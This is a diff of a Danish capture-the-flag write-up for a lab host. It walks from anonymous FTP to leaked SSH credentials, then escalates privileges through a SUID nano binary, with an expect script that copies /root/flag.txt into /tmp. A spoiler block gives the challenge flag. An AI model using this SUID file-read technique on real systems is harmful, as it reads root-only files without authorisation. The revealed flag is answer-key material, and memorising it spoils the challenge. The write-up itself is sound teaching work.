@@ -27,10 +27,30 @@
 ftp anonymous@escalator.hkn           # LIST -> credentials.txt (alex:r341mvpc3rt)
 ssh alex@escalator.hkn</code></pre>
 <h2>Privesc via SUID nano</h2>
-<pre><code>find / -perm -4000 -type f 2>/dev/null    # /usr/bin/nano (SUID root!)</code></pre>
-             <p>I nano 6.2 kører <code>^R^X</code>-shellen som din uid — men nanos <strong>fil-læsning</strong> bruger
-             euid=root. Brug <code>^R</code> (Read File) til at indsætte <code>/root/flag.txt</code> i bufferen og gem en
-             kopi (automatisér med <code>expect</code>).</p>
+<pre><code>find / -perm -4000 -type f 2>/dev/null    # /usr/bin/nano (SUID root!)
+ls -la /usr/bin/nano                       # -rwsr-xr-x root root</code></pre>
+             <p>GTFObins' klassiske nano-trick (<code>^R^X</code>, "read + execute" åbner en root-shell) virker
+             <strong>ikke</strong> på nyere nano (6.2 her): den subprocess kører som din egen uid, ikke root.
+             Men nanos <strong>fil-operationer</strong> (åbne/indsætte/gemme) kører stadig med SUID-bittens
+             euid=root. Så i stedet for at prøve at få en shell, bruger du nano til at læse en root-kun fil ind
+             og gemme en kopi du selv ejer:</p>
+             <ul>
+             <li><kbd>Ctrl+R</kbd> ("Read File"/insert): indsæt <code>/root/flag.txt</code> i bufferen (læses som root).</li>
+             <li><kbd>Ctrl+O</kbd> ("Write Out"): gem bufferen til en sti du selv kan læse bagefter, fx <code>/tmp/rf</code>.</li>
+             <li><kbd>Ctrl+X</kbd>: afslut nano.</li>
+             </ul>
+             <p>Gør du det manuelt i et interaktivt nano-vindue virker det fint, men prompterne er nemme at ramme
+             forkert. Automatisér med <code>expect</code> i stedet:</p>
+             <pre><code>expect -c '
+spawn nano /tmp/rf
+expect "GNU nano"
+send "\x12"; expect "File to insert"; send "/root/flag.txt\r"
+send "\x0f"; expect "File Name to Write"; send "\r"
+send "\x18"
+'
+cat /tmp/rf</code></pre>
+             <p><code>\x12</code>/<code>\x0f</code>/<code>\x18</code> er byte-værdierne for Ctrl+R/Ctrl+O/Ctrl+X;
+             <code>expect</code> venter på nanos prompt-tekst mellem hvert tryk, så timingen rammer rigtigt.</p>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flaget indeholder et <strong>mellemrum</strong> (verificeret med <code>od -c</code>):</p>
         <p>Flag: <span class="flag">HKN{ups3t_th3 e5tab1ish3d_0rd3r}</span></p>
